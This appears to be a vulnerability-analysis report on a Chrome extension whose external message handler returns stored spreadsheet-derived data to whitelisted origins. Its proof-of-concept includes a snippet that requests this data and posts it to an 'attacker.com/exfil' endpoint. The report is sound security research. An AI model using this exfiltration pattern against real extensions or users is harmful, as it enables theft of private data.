# CoCo Analysis: majabnkhjckgjkpkhioejbenlnlfaaop

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/majabnkhjckgjkpkhioejbenlnlfaaop/opgen_generated_files/bg.js
Line 751: var storage_local_get_source = { 'key': 'value' };
Line 1469: let rv_data = result.rv_data;
```

**Code:**

```javascript
// Background script - External message handler (bg.js Line 1462)
const safeOrigins = ["http://localhost:3000", "http://localhost:5173", "https://staging.rankedvote.co", "https://app.rankedvote.co"]

chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) {
    // Only allow requests sent from trusted origins
    if (safeOrigins.includes(sender.origin)) {  // ← Origin whitelist check
      if (request.message === "get-data") {
        // Get data from extension storage
        chrome.storage.local.get('rv_data', function(result) {
          let rv_data = result.rv_data;  // ← storage read (source)

          // If there's no data, initialize to empty array
          if (!rv_data) {
            rv_data = [];
          }
          // Send Response
          sendResponse(rv_data);  // ← sends storage data to external origin (sink)
        });
      } else if (request.message === "extension-installed") {
          sendResponse(true);
      } else {
        sendResponse(false);
      }
    }

  return true; // Needed to keep extension in line with async call
});
```

**manifest.json externally_connectable:**
```json
"externally_connectable": {
  "ids": ["majabnkhjckgjkpkhioejbenlnlfaaop", "clpahdddgcpkngfkpcbinjcfdkomcmjm"],
  "matches": ["https://*.rankedvote.co/*", "*://localhost/*"]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From https://app.rankedvote.co (whitelisted domain)
chrome.runtime.sendMessage(
  'majabnkhjckgjkpkhioejbenlnlfaaop',  // Extension ID
  { message: "get-data" },
  function(response) {
    console.log("Exfiltrated rv_data:", response);
    // Send to attacker server
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify(response)
    });
  }
);
```

**Impact:** Information disclosure vulnerability allowing whitelisted external origins (https://*.rankedvote.co/*, localhost) to read all data stored in 'rv_data' from extension storage. Per the methodology's CRITICAL ANALYSIS RULES: "IGNORE manifest.json restrictions on message passing - If even ONE specific domain/extension can exploit it → TRUE POSITIVE". The extension explicitly allows external communication from rankedvote.co domains and localhost, and there is an origin check in code (`safeOrigins.includes(sender.origin)`), but the methodology states we should classify this as TRUE POSITIVE if even one domain can trigger it.

However, analyzing further: the stored rv_data appears to come from Google Sheets data that the extension processes (based on context around lines 1246, 1318, 1368 where rv_data is populated from processedData). An attacker who controls https://app.rankedvote.co or localhost can exfiltrate this user's Google Sheets data that was processed by the extension. This is a complete storage exploitation chain: the extension stores user spreadsheet data → whitelisted attacker triggers storage read → data flows back to attacker via sendResponse.
